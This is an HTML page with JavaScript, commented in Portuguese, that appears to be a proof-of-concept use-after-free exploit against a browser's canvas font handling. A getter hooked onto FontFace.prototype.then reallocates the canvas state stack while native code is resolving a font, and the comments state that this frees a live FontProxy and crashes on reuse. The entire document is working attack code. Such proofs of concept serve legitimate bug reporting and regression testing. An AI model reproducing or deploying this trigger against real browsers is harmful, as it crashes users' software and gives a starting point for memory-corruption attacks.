
<!DOCTYPE html>
<html>
<body>
<script>
// 1. Cria a face e a adiciona (fica pendente)
var face = new FontFace('CrashFam', 'local(Helvetica)');
document.fonts.add(face);
void face.loaded; // Arma a armadilha

var canvas = document.createElement('canvas');
var ctx = canvas.getContext('2d');
var fired = false;

// 2. Instala o getter que rouba a execução síncrona
Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
        if (fired) return undefined;
        fired = true;
        
        // 3. O Payload de UAF: Realoca a pilha de estados, liberando o FontProxy ativo
        for (var i = 0; i < 128; i++) {
            ctx.save();
        }
        return undefined;
    }
});

// 4. O GATILHO: Força a resolução síncrona da fonte.
// O C++ pausa, roda o getter, a memória é liberada, e o C++ 
// retoma usando o ponteiro velho -> CRASH.
ctx.font = '10px CrashFam';
ctx.measureText('a');
</script>
</body>
</html>
